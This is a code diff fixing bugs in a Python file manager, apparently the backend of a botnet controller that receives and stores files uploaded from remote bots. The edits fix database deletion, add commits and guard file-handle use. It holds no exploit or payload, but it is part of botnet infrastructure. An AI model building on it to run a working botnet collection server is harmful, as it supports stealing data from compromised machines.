@@ -24,7 +24,7 @@ class BotNetFileManager:
             entries = FilenameEntry.query.all()
             for entry in entries:
                 if not os.path.exists(entry.real_filename):
-                    db.session.remove(entry)
+                    db.session.delete(entry)
             db.session.commit()
 
     def fileIsDownloading(self, user, filename):
@@ -66,17 +66,16 @@ class BotNetFileManager:
             # If the file object hasn't been made, make it
             if uf not in self.fileobjs:
                 self.fileobjs[uf] = open(real_filename, "wb")
-            # Otherwise, if it isn't closed, add to it
-            else:
-                if not self.fileobjs[uf].closed:
-                    self.fileobjs[uf].write(wbytes)
+            if not self.fileobjs[uf].closed:
+                self.fileobjs[uf].write(wbytes)
 
     def closeFile(self, user, filename):
         uf = (user, filename)
         with self.lock:
-            if not self.fileobjs[uf].closed:
-                self.fileobjs[uf].close()
-            self.fileobjs.pop(uf)
+            if uf in self.fileobjs:
+                if not self.fileobjs[uf].closed:
+                    self.fileobjs[uf].close()
+                self.fileobjs.pop(uf)
 
     def setFileSize(self, user, filename, filesize):
         uf = (user, filename)
@@ -90,10 +89,11 @@ class BotNetFileManager:
                 db.session.add(newentry)
             else:
                 entry.max_size = filesize
+                real_filename = entry.real_filename
             db.session.commit()
 
             if uf not in self.fileobjs:
-                self.fileobjs[uf] = open(filename, "wb")
+                self.fileobjs[uf] = open(real_filename, "wb")
 
     def getFilesAndInfo(self):
         '''
@@ -110,6 +110,7 @@ class BotNetFileManager:
                 downloaded = fileentry.curr_size
                 size = fileentry.max_size
                 fileinfo.append(dict(user=user,filename=filename,size=size,downloaded=downloaded))
+            print("getFilesAndInfo returned {} objects".format(len(fileinfo)))
             return fileinfo
 
     def getFileName(self, user, filename):
@@ -123,16 +124,18 @@ class BotNetFileManager:
     def deleteFile(self, user, filename):
         uf = (user, filename)
         with self.lock:
+            print("[*] Deleting {}:{}".format(user,filename))
             entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
             if entry is not None:
                 if uf in self.fileobjs:
                     self.fileobjs[uf].close()
                 real_filename = entry.real_filename
                 try:
-                    db.session.remove(entry)
+                    db.session.delete(entry)
+                    db.session.commit()
                     os.remove(real_filename)
-                except:
-                    pass
+                except Exception as e:
+                    print(e)
                 return True
             return False
 
@@ -155,8 +158,11 @@ class FilenameEntry(db.Model):
 
     def __repr__(self):
         if self.curr_size != self.max_size:
-            return "<{}:{}@{} [{}/{}]>".format(self.user,self.remote_filename,
-                                               self.real_filename,
+            return "<{}:{}@{} [{}/{}]>".format(self.user,os.path.basename(self.remote_filename),
+                                               os.path.basename(self.real_filename),
                                                str(self.curr_size),str(self.max_size))
         else:
-            return "<{}:{}@{}>".format(self.user,self.remote_filename,self.real_filename)
+            return "<{}:{}@{}>".format(self.user,os.path.basename(self.remote_filename),
+                                       os.path.basename(self.real_filename))
+    def __str__(self):
+        return self.__repr__()
